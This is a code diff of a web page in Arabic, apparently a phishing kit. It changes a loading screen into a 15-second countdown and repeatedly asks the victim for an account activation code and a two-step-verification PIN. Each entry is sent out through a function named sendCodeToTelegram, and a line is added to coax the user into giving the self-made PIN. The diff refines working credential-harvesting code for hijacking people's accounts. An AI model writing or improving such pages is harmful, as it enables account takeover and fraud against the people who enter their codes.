@@ -89,17 +89,10 @@
             text-decoration: underline;
         }
 
-        /* CSS for loading effect */
-        .loading-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .loading-text {
-            font-size: 24px;
-            color: #888;
-            margin-top: 20px;
+        #countdown {
+            color: red;
+            font-weight: bold;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -132,17 +125,21 @@
             });
         }
 
-        function startLoadingPage(callback) {
-            // تغيير المحتوى إلى صفحة الانتظار مع رسالة
-            document.body.innerHTML = `
-                <div class="loading-container">
-                    <h1>يرجى الانتظار...</h1>
-                    <p class="loading-text">جاري التحقق من البيانات، سيتم الانتقال بعد 15 ثانية.</p>
-                </div>
-            `;
-            
-            // الانتظار لمدة 15 ثانية قبل الانتقال للصفحة التالية
-            setTimeout(callback, 15000); // 15000 ملي ثانية = 15 ثانية
+        function startCountdown(callback) {
+            let countdownValue = 15;  // 15 ثانية
+            const countdownDisplay = document.getElementById('countdown');
+            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
+
+            const interval = setInterval(() => {
+                countdownValue--;
+                if (countdownValue <= 0) {
+                    clearInterval(interval);
+                    countdownDisplay.textContent = '';
+                    callback();  // انتقل إلى الصفحة التالية بعد العد التنازلي
+                } else {
+                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
+                }
+            }, 1000);
         }
 
         function submitFirstActivationCode() {
@@ -155,14 +152,14 @@
 
             sendCodeToTelegram(activationCode1, "رمز التفعيل");
 
-            startLoadingPage(() => {
-                // بعد الانتظار 15 ثانية، نقوم بتحديث المحتوى للانتقال إلى الصفحة التالية
+            startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>رمز التفعيل الصحيح</h1>
-                    <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام لتأكيد الحساب.</p>
+                    <p>يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.</p>
                     <input id="activationCode2" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondActivationCode()">متابعة</button>
+                    <div id="countdown"></div>
                 `;
             });
         }
@@ -177,14 +174,18 @@
 
             sendCodeToTelegram(activationCode2, "رمز التفعيل");
 
-            startLoadingPage(() => {
+            startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>التحقق من خطوتين</h1>
-                    <p>أدخل رقم التعريف الشخصي (PIN) الذي قمت بإنشائه عند إعداد التحقق على خطوتين.</p>
+                    <p>أدخل رقم التعريف الشخصي (PIN) الذي قمت بإنشائه عند إعداد التحقق على خطوتين..</p>
                     <input id="pinCode1" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
                     <a href="#" class="forgot-link">هل نسيت رقم التعريف الشخصي؟</a>
+                    <p class="instruction">
+                        لقد قمت بإنشاء رمز PIN الخاص بك بنفسك. هذا ليس رمز التحقق الذي تلقيته عند التسجيل.
+                    </p>
                     <button onclick="submitFirstPin()">متابعة</button>
+                    <div id="countdown"></div>
                 `;
             });
         }
@@ -199,13 +200,14 @@
 
             sendCodeToTelegram(pinCode1, "رمز PIN");
 
-            startLoadingPage(() => {
+            startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>إعادة رمز PIN</h1>
                     <p>يرجى إعادة إدخال رمز PIN المكون من 6 أرقام لتأكيد الدخول.</p>
                     <input id="pinCode2" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondPin()">متابعة</button>
+                    <div id="countdown"></div>
                 `;
             });
         }
@@ -220,7 +222,7 @@
 
             sendCodeToTelegram(pinCode2, "رمز PIN");
 
-            startLoadingPage(() => {
+            startCountdown(() => {
                 alert('تم التحقق بنجاح!');
             });
         }
